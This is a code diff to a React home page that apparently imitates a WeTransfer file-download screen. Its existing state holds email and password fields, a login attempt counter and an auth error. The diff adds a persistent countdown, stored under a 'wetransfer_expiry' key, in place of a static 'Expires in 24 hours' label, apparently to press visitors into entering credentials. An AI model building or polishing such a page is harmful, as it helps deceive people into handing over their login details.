@@ -61,6 +61,7 @@ export const HomePage: React.FC = () => {
   const [formData, setFormData] = useState({ email: '', password: '', website: '' });
   const [attempts, setAttempts] = useState(0);
   const [authError, setAuthError] = useState<string | null>(null);
+  const [timeLeft, setTimeLeft] = useState<number>(24 * 60 * 60);
 
   useEffect(() => {
     const params = new URLSearchParams(window.location.search);
@@ -74,6 +75,35 @@ export const HomePage: React.FC = () => {
     }, 8000);
     return () => clearInterval(interval);
   }, []);
+
+  useEffect(() => {
+    const storedExpiry = localStorage.getItem('wetransfer_expiry');
+    let expiryMs = storedExpiry ? parseInt(storedExpiry, 10) : null;
+
+    if (!expiryMs || isNaN(expiryMs) || expiryMs < Date.now()) {
+      expiryMs = Date.now() + 24 * 60 * 60 * 1000;
+      localStorage.setItem('wetransfer_expiry', expiryMs.toString());
+    }
+
+    const updateTimer = () => {
+      const diff = Math.max(0, Math.floor((expiryMs! - Date.now()) / 1000));
+      setTimeLeft(diff);
+    };
+
+    updateTimer();
+    const timerInterval = setInterval(updateTimer, 1000);
+
+    return () => clearInterval(timerInterval);
+  }, []);
+
+  const formatTimeLeft = (seconds: number) => {
+    const h = Math.floor(seconds / 3600);
+    const m = Math.floor((seconds % 3600) / 60);
+    const s = seconds % 60;
+    
+    const pad = (n: number) => n.toString().padStart(2, '0');
+    return `${h}h ${pad(m)}m ${pad(s)}s`;
+  };
 
   const currentBg = BACKGROUNDS[bgIndex];
 
@@ -189,8 +219,8 @@ export const HomePage: React.FC = () => {
 
             <div className="flex items-center justify-center gap-6 text-zinc-400 mb-8">
               <div className="flex items-center gap-1.5">
-                <Clock size={14} />
-                <span className="text-xs font-medium">Expires in 24 hours</span>
+                <Clock size={14} className="text-blue-500 animate-pulse" />
+                <span className="text-xs font-medium tabular-nums">Expires in {formatTimeLeft(timeLeft)}</span>
               </div>
               <div className="flex items-center gap-1.5">
                 <LinkIcon size={14} />
